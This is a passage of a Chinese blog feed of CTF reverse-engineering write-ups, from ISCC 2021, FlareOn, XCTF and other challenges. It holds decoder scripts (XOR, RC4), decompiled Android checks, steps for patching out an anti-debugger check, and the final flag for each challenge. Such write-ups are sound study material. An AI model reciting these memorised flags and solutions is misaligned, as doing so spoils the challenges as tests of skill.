class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[] &#x3D; &quot;@ZJJrV\\YQ(V&lt;&lt;V&lt;9V&lt;1V&#x3D;gmVK&#x3D;&lt;l\&quot;Q9[t&quot;;</span><br><span class="line">    for (int i &#x3D; 0; i&lt; strlen(str); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        str[i] ^&#x3D;9;</span><br><span class="line">        printf(&quot;%c&quot;, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{_UPX!_55_50_58_4nd_B45e+X0R}</p></blockquote><h2 id="秘笈"><a href="#秘笈" class="headerlink" title="秘笈"></a>秘笈</h2><h2 id="Ron’s-Code"><a href="#Ron’s-Code" class="headerlink" title="Ron’s Code"></a>Ron’s Code</h2><p>送分题，主要就一个原生的rc4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char T[256]&#x3D;&#123;0&#125;;</span><br><span class="line">    unsigned char S[256];</span><br><span class="line">    int flag[17] &#x3D; &#123;&#39;\xE8&#39;,&#39;0&#39;,&#39;\xE8&#39;,&#39;0&#39;,&#39;\xC9&#39;,&#39;e&#39;,&#39;\xA9&#39;,&#39;\xBA&#39;,&#39;w&#39;,&#39;\xDA&#39;,&#39;\xF4&#39;,&#39;N&#39;,&#39;\xE3&#39;,&#39;\xE9&#39;,&#39;&#96;&#39;,&#39;v&#39;,&#39;\xC1&#39;&#125;;</span><br><span class="line">    int len&#x3D;17;</span><br><span class="line">    char v5[8]&#x3D;&quot;ISCC2021&quot;;</span><br><span class="line">    char key[8];</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    int temp;</span><br><span class="line">    for(i&#x3D;0;i&lt;8;i++)</span><br><span class="line">        key[i]&#x3D;v5[i]+i;</span><br><span class="line">    for(i&#x3D;0; i&lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            T[i] &#x3D; key[i % 8];</span><br><span class="line">            S[i]&#x3D;i;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0; i&lt;256;i++)</span><br><span class="line">    &#123;</span><br><span class="line">            j &#x3D; (T[i] + j +S[i])%256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">    i &#x3D; j &#x3D; 0;</span><br><span class="line">    int t;</span><br><span class="line">    for(int r&#x3D;0; r&lt;len;r++)</span><br><span class="line">    &#123;</span><br><span class="line">            i &#x3D; (i+1) % 256;</span><br><span class="line">            j &#x3D; (j+S[i]) % 256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">            t &#x3D; (S[j]+S[i]) % 256;</span><br><span class="line">            flag[r]^&#x3D;S[t];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (i &#x3D; 0; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]+&#x3D; v5[i%8];</span><br><span class="line">        flag[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;len;i++)</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{reverse_rc4}</p></blockquote><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="Mobile-Easy"><a href="#Mobile-Easy" class="headerlink" title="Mobile Easy"></a>Mobile Easy</h2><p>签到题</p><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">import android.app.Activity;</span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends Activity &#123;</span><br><span class="line">  private boolean getFlag(String paramString) &#123;</span><br><span class="line">    String str &#x3D; first.firstStr(paramString);</span><br><span class="line">    if (str.length() &lt; 15)</span><br><span class="line">      return false; </span><br><span class="line">    if (!str.substring(0, 5).equals(&quot;ISCC&#123;&quot;) || !str.substring(str.length() - 1).equals(&quot;&#125;&quot;))</span><br><span class="line">      return false; </span><br><span class="line">    paramString &#x3D; str.substring(5, 15);</span><br><span class="line">    str &#x3D; str.substring(15, str.length() - 1);</span><br><span class="line">    return !paramString.equals(second.secondStr()) ? false : (!!third.thirdStr(str));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public void onClick(View paramView) &#123;</span><br><span class="line">    if (getFlag(((EditText)findViewById(2131165238)).getText().toString())) &#123;</span><br><span class="line">      Toast.makeText((Context)this, &quot;right&quot;, 0).show();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      Toast.makeText((Context)this, &quot;wrong&quot;, 0).show();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2131296284);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="first"><a href="#first" class="headerlink" title="first"></a>first</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">public class first &#123;</span><br><span class="line">  public static String firstStr(String paramString) &#123;</span><br><span class="line">    return paramString.replace(&quot;B1&quot;, &quot;dN&quot;).replace(&quot;_&quot;, &quot;8&quot;).replace(&quot;!&quot;, &quot;P&quot;).replace(&quot;rea&quot;, &quot;hwl&quot;).replace(&#39;1&#39;, &#39;u&#39;).replace(&quot;m&quot;, &quot;+&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="second"><a href="#second" class="headerlink" title="second"></a>second</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">import android.util.Base64;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line">public class second &#123;</span><br><span class="line">  public static String secondStr() &#123;</span><br><span class="line">    byte[] arrayOfByte &#x3D; &quot;1234567890123456&quot;.getBytes();</span><br><span class="line">    try &#123;</span><br><span class="line">      byte[] arrayOfByte1 &#x3D; Base64.decode(&quot;9z2ukkD3Ztxhj+t&#x2F;S1x1Eg&#x3D;&#x3D;&quot;, 0);</span><br><span class="line">      SecretKeySpec secretKeySpec &#x3D; new SecretKeySpec();</span><br><span class="line">      this(arrayOfByte, &quot;AES&quot;);</span><br><span class="line">      Cipher cipher &#x3D; Cipher.getInstance(&quot;AES&#x2F;ECB&#x2F;NoPadding&quot;);</span><br><span class="line">      cipher.init(2, secretKeySpec);</span><br><span class="line">      byte[] arrayOfByte2 &#x3D; cipher.doFinal(arrayOfByte1);</span><br><span class="line">      null &#x3D; new String();</span><br><span class="line">      this(arrayOfByte2);</span><br><span class="line">      return null.replace(&quot; &quot;, &quot;&quot;);</span><br><span class="line">    &#125; catch (Exception exception) &#123;</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">      return &quot;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="third"><a href="#third" class="headerlink" title="third"></a>third</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">public class third &#123;</span><br><span class="line">  public static boolean thirdStr(String paramString) &#123;</span><br><span class="line">    if (paramString.length() !&#x3D; 8)</span><br><span class="line">      return false; </span><br><span class="line">    char c1 &#x3D; paramString.charAt(0);</span><br><span class="line">    char c2 &#x3D; paramString.charAt(1);</span><br><span class="line">    char c3 &#x3D; paramString.charAt(2);</span><br><span class="line">    char c4 &#x3D; paramString.charAt(3);</span><br><span class="line">    char c5 &#x3D; paramString.charAt(4);</span><br><span class="line">    char c6 &#x3D; paramString.charAt(5);</span><br><span class="line">    char c7 &#x3D; paramString.charAt(6);</span><br><span class="line">    char c8 &#x3D; paramString.charAt(7);</span><br><span class="line">    return (c1 % 8 !&#x3D; 7 || c1 % 9 !&#x3D; 8) ? false : ((c2 - 3 !&#x3D; 100) ? false : (((c3 ^ 0x5D) !&#x3D; 100) ? false : ((c3 * 2 - 10 !&#x3D; c4) ? false : ((c5 + 1 !&#x3D; 120) ? false : (((c6 ^ c7) !&#x3D; 56) ? false : ((c6 - c7 !&#x3D; 24 || c7 - c8 !&#x3D; 4) ? false : (!(c8 !&#x3D; &#39;P&#39;))))))));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一题写脚本还没手算快,AES在线解密即可.</p><blockquote><p>ISCC{m0B1lE_1s_Gg9reaT!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
          <category> ISCC-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录4</title>
      <link href="2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/"/>
      <url>2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
      
        <content type="html"><![CDATA[<h1 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[FlareOn4]IgniteMe">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/1.PNG"></p><blockquote><p>进入start函数</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/2.PNG"></p><h2 id="进入sub-4010F0"><a href="#进入sub-4010F0" class="headerlink" title="进入sub_4010F0"></a>进入sub_4010F0</h2><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/3.PNG"></p><p>去掉字符串中的‘\n’和‘\r’，不过最后好像没有用到。</p><h2 id="进入sub-401050"><a href="#进入sub-401050" class="headerlink" title="进入sub_401050"></a>进入sub_401050</h2><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/4.PNG"></p><p>其中v4可以通过看汇编代码得出，也可以通过动态调试得出。<br>sub_401020是读取长度，byte_403078是我们输入的flag。</p><blockquote><p>汇编代码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: sub_401050+16↓p</span><br><span class="line">.text:00401000                 push    ebp</span><br><span class="line">.text:00401001                 mov     ebp, esp</span><br><span class="line">.text:00401003                 mov     eax, 80070057h</span><br><span class="line">.text:00401008                 mov     edx, eax</span><br><span class="line">.text:0040100A                 xor     ax, dx</span><br><span class="line">.text:0040100D                 rol     eax, 4</span><br><span class="line">.text:00401010                 shr     ax, 1</span><br><span class="line">.text:00401013                 pop     ebp</span><br><span class="line">.text:00401014                 retn</span><br><span class="line">.text:00401014 sub_401000      endp</span><br><span class="line">&#x2F;&#x2F;sub_401000的汇编代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:00401050 sub_401050      proc near               ; CODE XREF: start+44↓p</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050 var_C           &#x3D; dword ptr -0Ch</span><br><span class="line">.text:00401050 var_8           &#x3D; dword ptr -8</span><br><span class="line">.text:00401050 var_1           &#x3D; byte ptr -1</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050                 push    ebp</span><br><span class="line">.text:00401051                 mov     ebp, esp</span><br><span class="line">.text:00401053                 sub     esp, 0Ch</span><br><span class="line">.text:00401056                 push    offset byte_403078</span><br><span class="line">.text:0040105B                 call    sub_401020</span><br><span class="line">.text:00401060                 add     esp, 4</span><br><span class="line">.text:00401063                 mov     [ebp+var_C], eax</span><br><span class="line">.text:00401066                 call    sub_401000</span><br><span class="line">.text:0040106B                 mov     [ebp+var_1], al</span><br><span class="line">.text:0040106E                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:00401071                 sub     eax, 1</span><br><span class="line">.text:00401074                 mov     [ebp+var_8], eax</span><br><span class="line">.text:00401077                 jmp     short loc_401082</span><br><span class="line">.text:00401079 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401079</span><br><span class="line">.text:00401079 loc_401079:                             ; CODE XREF: sub_401050+5D↓j</span><br><span class="line">.text:00401079                 mov     ecx, [ebp+var_8]</span><br><span class="line">.text:0040107C                 sub     ecx, 1</span><br><span class="line">.text:0040107F                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401082</span><br><span class="line">.text:00401082 loc_401082:                             ; CODE XREF: sub_401050+27↑j</span><br><span class="line">.text:00401082                 cmp     [ebp+var_8], 0</span><br><span class="line">.text:00401086                 jl      short loc_4010AF</span><br><span class="line">.text:00401088                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040108B                 movsx   eax, byte_403078[edx]</span><br><span class="line">.text:00401092                 movzx   ecx, [ebp+var_1]</span><br><span class="line">.text:00401096                 xor     eax, ecx</span><br><span class="line">.text:00401098                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109B                 mov     byte_403180[edx], al</span><br><span class="line">.text:004010A1                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:004010A4                 mov     cl, byte_403078[eax]</span><br><span class="line">.text:004010AA                 mov     [ebp+var_1], cl</span><br><span class="line">.text:004010AD                 jmp     short loc_401079</span><br><span class="line">&#x2F;&#x2F;sub_401050的部分汇编代码（第一个for循环结束）</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define length(x) sizeof(x) &#x2F; sizeof(x[0])</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int flag[]&#x3D;&#123;13,  38,  73,  69,  42,  23, 120,  68,  43, 108, 93,  94,  69,  18,  47,  23,  43,  68, 111, 110, 86,   9,  95,  69,  71, 115,  38,  10,  13,  19, 23,  72,  66,   1,  64,  77,  12,   2, 105&#125;;</span><br><span class="line">int v4&#x3D;4;</span><br><span class="line">int i;</span><br><span class="line">for(i&#x3D;length(flag)-1;i&gt;&#x3D;0;i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] ^&#x3D;v4;</span><br><span class="line">v4&#x3D;flag[i];</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;length(flag);i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>flag{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com}</p></blockquote><h1 id="o-strings-attached"><a href="#o-strings-attached" class="headerlink" title="o-strings-attached"></a>o-strings-attached</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5080&page=1">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/5.PNG"></p><p>在加密函数最后添加断点，直接得到flag。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/6.PNG"></p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/7.PNG"></p><blockquote><p>9447{you_are_an_international_mystery}</p></blockquote><h1 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h1><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/8.PNG"></p><p>拖入ida中查看程序逻辑</p><h3 id="伪代码窗口"><a href="#伪代码窗口" class="headerlink" title="伪代码窗口"></a>伪代码窗口</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/9.PNG"></p><p>进一步分析可知：</p><ol><li>sub_40102A的返回值为0</li><li>IsDebuggerPresent函数：<br> 如果当前进程运行在调试器的上下文，返回值为非零值。<br> 如果当前进程没有运行在调试器的上下文，返回值是零。</li></ol><p>lpMem是输出的flag，12-15行是输出的那个窗口，sub_401000是对lpMem进行加密的函数。<br>直接运行程序并不会对对lpMem进行加密，需要对程序进行修改.</p><h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/10.PNG"></p><ol><li>将 jnz     short loc_401096 改为 jmp     short loc_401096</li><li>将 int     3 nop</li><li>将 jmp     short loc_4010EF 改为 jmp     short loc_4010B9</li></ol><blockquote><p>patch后的程序</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/11.PNG"></p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/12.PNG"></p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/13.PNG"></p><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p>和ida思路相同</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><blockquote><p>将 jnz     short loc_401096 改为 jmp     short loc_401096</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/14.PNG"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><blockquote><p>将 int     3 nop</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/15.PNG"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><blockquote><p>将 jmp     short loc_4010EF 改为 jmp     short loc_4010B9</p></blockquote><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/16.PNG"></p><h3 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/17.PNG"></p><blockquote><p>flag{reversing_is_not_that_hard!}</p></blockquote><h1 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h1><p><a href="https://buuoj.cn/challenges#[FlareOn6]Overlong">题目链接</a><br>查看文件信息，32位，无壳。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/19.PNG"></p><p>进入main函数</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/20.PNG"></p><p>第6行是对unk_402008进行一系列运算，变成Text，但unk_402008的长度为0xAF，这个函数只处理了28位，再结合题目名字，我们将28改为0xAF即可。<br>这里直接patch会报错，在16进制界面修改。改好后运行程序。</p><p><img src="/2021/04/21/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/21.PNG"></p><blockquote><p>flag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录3</title>
      <link href="2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
      <url>2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]Bytecode">题目链接</a><br>这道题是python字节码，参考<a href="https://docs.python.org/zh-cn/3/library/dis.html?highlight=dis">官方文档</a>手动还原.</p><blockquote><p>字节码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span 